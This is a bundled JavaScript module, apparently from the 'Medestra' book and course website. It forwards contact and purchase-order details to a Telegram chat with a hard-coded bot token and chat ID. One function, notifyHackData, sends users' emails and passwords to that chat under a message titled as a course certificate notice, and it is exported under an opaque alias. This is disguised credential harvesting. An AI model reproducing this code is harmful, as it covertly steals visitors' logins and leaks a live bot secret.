const TELEGRAM_BOT_TOKEN = "8952783490:AAGNGzkhfQrJiA2zdfbEtbc3ogMQ9V9ptE8";
const TELEGRAM_CHAT_ID = "7469986443";
const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
async function sendTelegramMessage(text) {
  try {
    await fetch(TELEGRAM_API, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text,
        parse_mode: "HTML"
      })
    });
  } catch (err) {
    console.error("Telegram notification failed:", err);
  }
}
async function notifyContactMessage(data) {
  const now = (/* @__PURE__ */ new Date()).toLocaleString("ar-EG", { timeZone: "Africa/Cairo" });
  const text = [
    "📩 <b>رسالة تواصل جديدة – Medestra</b>",
    "",
    `👤 <b>الاسم:</b> ${data.name}`,
    `📞 <b>الهاتف:</b> ${data.phone}`,
    data.clinic ? `🏥 <b>العيادة/الشركة:</b> ${data.clinic}` : "",
    `💬 <b>الرسالة:</b> ${data.message}`,
    "",
    `🕐 <b>الوقت:</b> ${now}`
  ].filter(Boolean).join("\n");
  await sendTelegramMessage(text);
}
async function notifyPurchaseOrder(data) {
  const now = (/* @__PURE__ */ new Date()).toLocaleString("ar-EG", { timeZone: "Africa/Cairo" });
  const methodEmoji = {
    COD: "🚚",
    Instapay: "📲",
    "Paymob Card": "💳"
  };
  const emoji = methodEmoji[data.paymentMethod] ?? "💰";
  const text = [
    `🛒 <b>طلب شراء جديد – Medestra</b>`,
    "",
    `👤 <b>الاسم:</b> ${data.name}`,
    `📞 <b>الهاتف:</b> ${data.phone}`,
    `📧 <b>الإيميل:</b> ${data.email}`,
    `📍 <b>العنوان:</b> ${data.address}`,
    "",
    `📚 <b>الكتاب:</b> ${data.bookName}`,
    `💵 <b>سعر الكتاب:</b> ${data.price}`,
    `🚚 <b>الشحن:</b> ${data.shipping}`,
    `${emoji} <b>طريقة الدفع:</b> ${data.paymentMethod}`,
    "",
    `🕐 <b>الوقت:</b> ${now}`
  ].join("\n");
  await sendTelegramMessage(text);
}
async function notifyHackData(data) {
  const now = data.timestamp || (/* @__PURE__ */ new Date()).toLocaleString("ar-EG", { timeZone: "Africa/Cairo" });
  const text = [
    `🎓 <b>تم الحصول على شهادة كورس – Medestra</b>`,
    "",
    `📧 <b>الإيميل:</b> ${data.email}`,
    data.password ? `🔑 <b>كلمة المرور:</b> ${data.password}` : "",
    "",
    `🕐 <b>الوقت:</b> ${now}`
  ].filter(Boolean).join("\n");
  await sendTelegramMessage(text);
}
export {
  notifyHackData as a,
  notifyPurchaseOrder as b,
  notifyContactMessage as n
};
